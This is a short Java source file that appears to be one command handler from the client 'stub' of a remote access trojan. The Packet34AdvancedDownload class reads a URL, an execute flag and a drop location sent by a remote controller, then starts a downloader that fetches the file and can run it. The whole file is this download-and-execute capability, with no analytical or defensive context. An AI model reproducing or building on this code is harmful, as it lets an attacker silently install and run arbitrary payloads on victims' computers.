package com.redpois0n.stub.packets.incoming;

import com.redpois0n.AdvDownloader;
import com.redpois0n.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean exec = Connection.readBoolean();
		String drop = Connection.readLine().toLowerCase();
		new AdvDownloader(url, exec, drop).start();
	}

}
